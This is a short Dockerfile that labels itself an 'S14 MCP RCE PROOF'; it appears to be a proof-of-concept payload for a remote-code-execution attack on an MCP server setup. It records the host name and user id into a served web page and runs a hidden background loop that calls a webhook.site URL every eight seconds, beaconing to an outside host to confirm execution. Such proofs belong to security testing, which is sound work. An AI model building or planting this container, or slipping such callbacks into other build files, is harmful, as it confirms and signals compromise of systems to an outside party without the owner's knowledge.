FROM alpine:3.19
RUN apk add --no-cache python3
WORKDIR /app
RUN echo "S14 MCP RCE PROOF - hostname=$(hostname) uid=$(id -u)" > /app/index.html
EXPOSE 8080
CMD ["sh","-c","printf 'S14-MCP-RCE host=%s uid=%s\n' \"$(hostname)\" \"$(id -u)\" > /app/index.html; (while true; do curl -s --max-time 4 https://webhook.site/8448c2a1-6896-4915-a94f-81e2c09b4a58 >/dev/null 2>&1; sleep 8; done) & python3 -m http.server 8080"]
